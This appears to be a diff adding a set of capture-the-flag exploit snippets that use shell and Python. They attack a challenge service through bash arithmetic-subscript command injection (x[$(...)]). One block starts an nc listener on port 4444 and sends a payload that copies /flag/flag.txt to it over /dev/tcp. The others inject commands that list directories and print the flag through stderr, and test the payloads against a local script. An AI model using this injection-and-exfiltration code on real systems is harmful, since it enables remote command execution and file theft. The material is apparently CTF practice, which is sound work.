@@ -1,0 +1,49 @@
+cd /tmp/gigatool && (timeout 25 nc -lvnp 4444 > /tmp/gigatool/exfil.txt 2>/tmp/gigatool/nc.log &) ; sleep 1; python3 - <<'EOF'
+import socket
+p=b'x[$(cat /flag/flag.txt > /dev/tcp/<LHOST_IP>/4444)]'
+s=socket.create_connection(("<CHAL_IP>",9000),timeout=15); s.settimeout(5)
+buf=b""
+try:
+    while b"(0..2)" not in buf:
+        c=s.recv(4096)
+        if not c: break
+        buf+=c
+except Exception: pass
+s.sendall(p+b"\n")
+try:
+    print("resp:", s.recv(200))
+except Exception as e: print("no resp")
+s.close()
+EOF
+sleep 3; echo "--- exfil ---"; cat /tmp/gigatool/exfil.txt 2>/dev/null; echo "--- nc log ---"; tail -3 /tmp/gigatool/nc.log
+
+# ---
+
+cd /tmp/gigatool && python3 - <<'EOF'
+import socket
+def run(payload, wait=6):
+    s=socket.create_connection(("<CHAL_IP>",9000),timeout=15); s.settimeout(wait)
+    buf=b""
+    try:
+        while b"(0..2)" not in buf:
+            c=s.recv(4096)
+            if not c: break
+            buf+=c
+    except Exception: pass
+    s.sendall(payload+b"\n")
+    out=b""
+    try:
+        while True:
+            c=s.recv(4096)
+            if not c: break
+            out+=c
+    except Exception: pass
+    s.close(); return out.decode(errors="replace")
+for p in [b'x[$(ls -la / >&2)]', b'x[$(ls /flag >&2; cat /flag/flag.txt >&2)]']:
+    print("=== ",p.decode())
+    print(run(p)[:900])
+EOF
+
+# ---
+
+cd /tmp/bb && for p in 'x[$(cat /tmp/bb/flag/flag.txt >/proc/$PPID/fd/1)]' 'x[$(ls / >&2)]' 'x[$(cat /flag/flag.txt 2>&1 >&2)]'; do echo "=== $p"; echo "$p" | ./s.sh 2>&1 | tail -3; done
